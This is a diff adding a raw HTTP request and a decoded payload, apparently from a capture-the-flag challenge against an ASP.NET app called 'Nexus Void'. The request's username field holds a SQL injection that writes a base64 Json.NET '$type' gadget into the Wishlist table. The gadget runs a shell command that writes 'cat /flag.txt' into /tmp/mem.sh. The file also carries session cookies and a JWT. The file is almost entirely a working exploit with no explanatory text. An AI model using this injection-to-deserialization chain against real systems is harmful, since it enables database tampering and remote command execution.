@@ -1,0 +1,19 @@
+POST /Home/Setting HTTP/1.1
+Host: 94.237.48.55:59516
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 405
+Origin: http://94.237.48.55:59516
+Connection: close
+Referer: http://94.237.48.55:59516/Home/Setting
+Cookie: .AspNetCore.Antiforgery.VyLW6ORzMgk=CfDJ8BqUrvxWIF1KkwAXiQpsrhS68Cnnxy0P1eofhj-V2aU1MLPm_3GtcEA9QC1nJpRiy_v35fT4pE0tTwdIXR_31SbR6VTWUk976zw0xxaR-olG4GZ_ovTXhLTSlGQZY7BSaxnNvrMZ7ubAFRTWRwBPodQ; Token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEiLCJJRCI6IjEiLCJleHAiOjE3MDI4Mjc5NjIsImlzcyI6Ik5leHVzVm9pZCIsImF1ZCI6Ik5leHVzVm9pZCJ9.CaKJGs0Uygyjg_085uz9V2P_e1cXKB9aN7NwNYY3hwc
+Upgrade-Insecure-Requests: 1
+
+username=a'%3b+UPDATE+Wishlist+SET+data%3d'eyIkdHlwZSI6Ik5leHVzX1ZvaWQuSGVscGVycy5TdGF0dXNDaGVja0hlbHBlciwgTmV4dXNfVm9pZCIsIm91dHB1dCI6ImhvbGEiLCJjb21tYW5kIjoiZWNobyAnY2F0IC9mbGFnLnR4dCcgPiAvdG1wL21lbS5zaCJ9'--&__RequestVerificationToken=CfDJ8BqUrvxWIF1KkwAXiQpsrhSZBtWON1ScgFcdBCowv4CYpteD7eSmOZrir-IgHl0cMSKLE7uzSiE1VoBfkt-Inx415NGQzZ79D5AdJoIBhWc-0uGXTobPY1SlGx4fVjwLbPmlqiwE6t8SdFtOvQ7sw3o
+
+
+-----DON'T COPY, SERIALIZED CLASS 
+{"$type":"Nexus_Void.Helpers.StatusCheckHelper, Nexus_Void","output":"hola","command":"echo 'cat /flag.txt' > /tmp/mem.sh"}
